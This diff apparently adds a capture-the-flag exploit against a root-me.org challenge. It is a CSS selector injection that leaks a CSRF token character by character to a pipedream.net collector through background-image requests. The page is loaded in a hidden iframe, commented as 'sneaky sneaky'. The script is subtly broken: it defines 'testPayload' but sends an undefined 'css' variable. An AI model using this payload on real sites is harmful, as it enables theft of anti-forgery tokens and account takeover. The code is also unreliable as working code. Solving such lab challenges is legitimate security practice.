@@ -1,0 +1,10 @@
+input[name=csrf][value^=a] ~ * {background-image:url(https://eo4adedl4xfs7hf.m.pipedream.net/a)%3B}
+
+<script>
+    document.getElementById("frames").innerHTML = "";
+    const testPayload = 'input[name=csrf][value^=b] ~ * {background-image:url(https://eo4adedl4xfs7hf.m.pipedream.net/b)%3B}';
+    frame = document.createElement("iframe");
+    frame.src = "http://challenge01.root-me.org:58005/?style=" + css;
+    frame.style="visibility: hidden;"; //gotta be sneaky sneaky like
+    document.getElementById("frames").appendChild(frame);
+</script>
